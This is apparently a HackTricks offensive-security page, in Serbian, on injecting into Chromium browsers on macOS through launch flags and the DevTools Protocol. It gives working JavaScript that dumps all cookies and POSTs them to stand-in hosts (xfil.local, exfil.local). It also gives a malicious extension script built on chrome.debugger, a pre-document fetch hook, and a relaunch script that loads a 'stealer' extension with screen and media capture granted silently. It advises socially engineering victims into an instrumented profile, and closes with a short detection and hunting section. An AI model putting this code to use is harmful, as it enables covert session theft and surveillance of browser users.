# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Osnovne informacije

Chromium-based browseri kao što su Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi i Opera koriste iste command-line switches, preference files i DevTools automation interfaces. Na macOS-u, svaki user sa GUI access-om može da terminira postojeću browser sesiju i ponovo je pokrene sa proizvoljnim flags, extensions ili DevTools endpoints koji rade sa entitlements ciljanog usera.

#### Pokretanje Chromium-a sa custom flags na macOS-u

macOS održava jednu UI instancu po Chromium profilu, pa instrumentation obično zahteva force-closing browsera (na primer pomoću `osascript -e 'tell application "Google Chrome" to quit'`). Attackers obično ponovo pokreću browser pomoću `open -na "Google Chrome" --args <flags>` kako bi injectovali arguments bez menjanja app bundle-a. Umotavanje te komande u user LaunchAgent (`~/Library/LaunchAgents/*.plist`) ili login hook garantuje da će se tampered browser ponovo pokrenuti nakon reboot-a/logoff-a.

#### `--load-extension` Flag

`--load-extension` flag automatski učitava unpacked extensions (putanje razdvojene zarezima). Kombinujte ga sa `--disable-extensions-except` kako biste blokirali legitimne extensions i primorali browser da pokrene samo vaš payload. Malicious extensions mogu zahtevati high-impact permissions kao što su `debugger`, `webRequest` i `cookies` kako bi se pivotovali u DevTools protocols, menjali CSP headers, downgrade-ovali HTTPS ili exfiltrated session material čim se browser pokrene.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Ovi switches izlažu Chrome DevTools Protocol (CDP) preko TCP-a ili pipe-a, tako da eksterni tooling može da upravlja browserom. Google je uočio široko rasprostranjenu infostealer zloupotrebu ovog interface-a i, počevši od Chrome-a 136 (mart 2025), ovi switches se ignorišu za default profile osim ako je browser pokrenut sa nestandardnim `--user-data-dir`. Ovo primenjuje App-Bound Encryption na realne profile, ali attackers i dalje mogu da pokrenu fresh profile, navedu victim-a da se autentifikuje unutar njega (phishing/triage assistance) i harvestuju cookies, tokens, device trust states ili WebAuthn registrations putem CDP-a.

#### `--user-data-dir` Flag

Ovaj flag preusmerava ceo browser profile (History, Cookies, Login Data, Preference files itd.) na path pod kontrolom attackera. Obavezan je pri kombinovanju modernih Chrome builds sa `--remote-debugging-port`, a takođe održava tampered profile izolovanim, tako da možete ubaciti unapred popunjene `Preferences` ili `Secure Preferences` files koje onemogućavaju security prompts, automatski instaliraju extensions i menjaju default schemes.

#### `--use-fake-ui-for-media-stream` Flag

Ovaj switch zaobilazi permission prompt za kameru/mikrofon, tako da svaka stranica koja pozove `getUserMedia` odmah dobija access. Kombinujte ga sa flags kao što su `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` ili CDP `Browser.grantPermissions` commands da biste nečujno capture-ovali audio/video, delili ekran ili zadovoljili WebRTC permission checks bez interakcije sa userom.

## Delivery & Relaunch Patterns Seen in the Wild

CDP abuse je obično **post-exploitation** faza, a ne initial payload. Nedavna macOS kampanja usmerena na developere koristila je poisoned Xcode **`Run Script` build phase** (`PBXShellScriptBuildPhase`), tako da se code izvršavao samo kada victim **build-uje** projekat, a ne kada ga samo clone-uje ili otvori. Nakon tog prvog izvršavanja, malware je takođe inficirao druga `.xcodeproj` stabla, dodao malicious Git `pre-commit` hooks i pretraživao ZIP archives u potrazi za dodatnim Xcode projects.

Kod Chromium abuse-a ovo je važno zato što attacker ne mora da patch-uje sam browser binary. Kratkotrajni build-phase / `osascript` stager umesto toga može da instalira **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher itd.) koji ponovo otvara legitimni browser sa flags pod kontrolom attackera svaki put kada ga user pokrene.

> [!TIP]
> Na developer endpoints, proverite `.pbxproj` files, `.git/hooks/pre-commit` i ZIPs koji sadrže `.xcodeproj` zbog neočekivanih `curl`, `osascript`, `xxd`, ugnježdenih `base64` ili Chrome relaunch logike.

## Remote Debugging & DevTools Protocol Abuse

Kada se Chrome ponovo pokrene sa namenskim `--user-data-dir` i `--remote-debugging-port`, možete se povezati preko CDP-a (npr. pomoću `chrome-remote-interface`, `puppeteer` ili `playwright`) i script-ovati workflows sa visokim privilegijama:

- **Cookie/session theft:** `Network.getAllCookies` i `Storage.getCookies` vraćaju HttpOnly vrednosti čak i kada bi App-Bound encryption uobičajeno blokirao filesystem access, zato što CDP traži od browsera koji radi da ih dekriptuje.
- **Permission tampering:** `Browser.grantPermissions` i `Emulation.setGeolocationOverride` omogućavaju zaobilaženje camera/mic prompts (posebno u kombinaciji sa `--use-fake-ui-for-media-stream`) ili falsifikovanje location-based security checks.
- **Keystroke/script injection:** `Runtime.evaluate` izvršava proizvoljni JavaScript unutar aktivnog taba, omogućavajući credential lifting, DOM patching ili injectovanje persistence beacons koji preživljavaju navigaciju.
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` i `Fetch.enable` presreću authenticated requests/responses u realnom vremenu bez dodirivanja disk artifacts.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Pošto Chrome 136 blokira CDP na podrazumevanom profilu, kopiranje postojeće `~/Library/Application Support/Google/Chrome` fascikle žrtve na staging putanju više ne daje dekriptovane cookies. Umesto toga, socijalnim inženjeringom navedite korisnika da se autentifikuje unutar instrumentiranog profila (npr. „korisna“ support sesija) ili presretanjем MFA tokena tokom prenosa putem CDP-controlled network hooks.

### XCSSET-style CDP Backdoor Chain

Praktičan obrazac malware-a je:

1. Ponovo pokrenuti userland implant ili wrapper svaki put kada se Chrome pokrene.
2. Pokrenuti legitimni browser sa `--remote-debugging-port=<port>` i, na Chrome 136+, obično uparenim non-default `--user-data-dir=<dir>`.
3. Pokrenuti helper koji se povezuje na lokalni CDP WebSocket i registruje pre-document hook pomoću `Page.addScriptToEvaluateOnNewDocument`.

Taj helper može da ubaci JavaScript **pre** nego što se pokrene kod sajta, što je idealno za hook-ovanje `window.fetch`, `XMLHttpRequest`, wallet provajdera ili autofill tokova bez izmene fajlova na disku.
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Još jača varijanta pretvara browser u **host command bridge**: ubačeni JavaScript emituje `console.log` sa delimiter markerom, lokalni helper prati `Runtime.consoleAPICalled`, uklanja marker, izvršava ostatak kroz host shell (na primer Go-ov `exec.Command`) i vraća stdout/stderr preko napadačevog WebSocket-a. Ovo nadograđuje izvršavanje skripti na nivou taba u uglavnom fileless reverse shell.

## Injection zasnovan na Extension-u putem Debugger API-ja

Istraživanje „Chrowned by an Extension“ iz 2023. godine pokazalo je da malicious extension koji koristi `chrome.debugger` API može da se poveže na bilo koji tab i dobije iste DevTools privilegije kao `--remote-debugging-port`. Time se narušavaju prvobitne pretpostavke o izolaciji (extensions ostaju u svom kontekstu) i omogućava:

- Tiha krađa cookies i credentials pomoću `Network.getAllCookies`/`Fetch.getResponseBody`.
- Izmena site permissions (kamera, mikrofon, geolokacija) i zaobilaženje security interstitial-a, čime phishing stranice mogu da oponašaju Chrome dijaloge.
- Tampering upozorenja za TLS, downloads ili WebAuthn prompt-ova preko programskog upravljanja funkcijama `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` ili `Security.handleCertificateError`.

Učitajte extension pomoću `--load-extension`/`--disable-extensions-except`, tako da nije potrebna nikakva interakcija korisnika. Minimalni background script koji weaponize-uje API izgleda ovako:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Ekstenzija takođe može da se pretplati na događaje `Debugger.paused` kako bi čitala JavaScript promenljive, menjala inline skripte ili dodavala prilagođene tačke prekida koje opstaju tokom navigacije. Pošto se sve izvršava unutar korisničke GUI sesije, Gatekeeper i TCC se ne aktiviraju, što ovu tehniku čini idealnom za malware koji je već postigao izvršavanje u kontekstu korisnika.

## Detekcija i Hunting

- Upozorite na Chromium pregledače pokrenute sa `--remote-debugging-port`, `--remote-debugging-pipe` ili sumnjivim `--user-data-dir`, naročito kada je roditeljski proces `bash`, `sh`, `osascript`, `xcodebuild` ili LaunchAgent helper.
- Potražite kratke nizove procesa u kojima helper otvara lokalni CDP WebSocket, registruje `Page.addScriptToEvaluateOnNewDocument`, a zatim uspostavlja dugotrajnu odlaznu WebSocket/HTTPS vezu.
- Istražite console-to-shell mostove korelisanjem aktivnosti pregledača `Runtime.consoleAPICalled` sa child shell procesima ili helper procesima koji izvršavaju komande koje je dostavio attacker.
- Na Mac računarima developera proverite `.pbxproj` `PBXShellScriptBuildPhase` unose, Git `pre-commit` hook-ove, Dock/login item relaunchere i Xcode projekte sadržane u ZIP arhivama zbog instalacije browser wrapper-a.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Alati

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatizuje pokretanje Chromium-a sa payload ekstenzijama i izlaže interaktivne CDP hooks.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Sličan alat fokusiran na presretanje saobraćaja i browser instrumentation za macOS operatore.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js biblioteka za automatizaciju Chrome DevTools Protocol dump-ova (cookies, DOM, permissions) nakon što je instanca sa `--remote-debugging-port` aktivna.

### Primer
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Pronađite još primera u linkovima ka alatima.

## Reference

- [https://chromedevtools.github.io/devtools-protocol/v8/Runtime/](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [https://chromedevtools.github.io/devtools-protocol/tot/Page/](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
